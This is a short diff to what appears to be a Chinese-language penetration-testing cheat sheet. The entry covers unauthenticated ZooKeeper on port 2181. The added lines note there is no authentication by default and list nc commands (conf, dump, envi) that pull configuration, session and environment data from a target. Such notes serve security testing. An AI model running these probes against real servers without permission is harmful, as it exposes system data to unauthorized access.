@@ -1,2 +1,6 @@
-未授权
-echo envi | nc xxx.xxx.xxx.xxx 2181
+Zookeeper 分布式协调 (2181)
+默认无认证
+漏洞：未授权访问、信息泄露
+测试: echo conf | nc target 2181
+echo dump | nc target 2181
+echo envi | nc target 2181
